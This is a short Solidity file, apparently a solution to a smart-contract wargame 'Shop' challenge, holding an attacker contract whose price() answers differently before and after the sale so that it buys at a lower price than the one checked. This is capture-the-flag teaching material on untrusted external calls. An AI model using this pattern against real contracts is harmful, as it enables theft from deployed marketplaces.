// 1 - Deploy this contract - Remix
// 2 - Call attack()

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract IShop {
    function buy() external virtual;

    bool public isSold;
}

contract ShopAttacker {
    IShop public shop;

    constructor(address challengeAddress) public payable {
        shop = IShop(challengeAddress);
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 101;
        } else {
            return 0;
        }
    }

    function attack() external {
        shop.buy();
    }
}
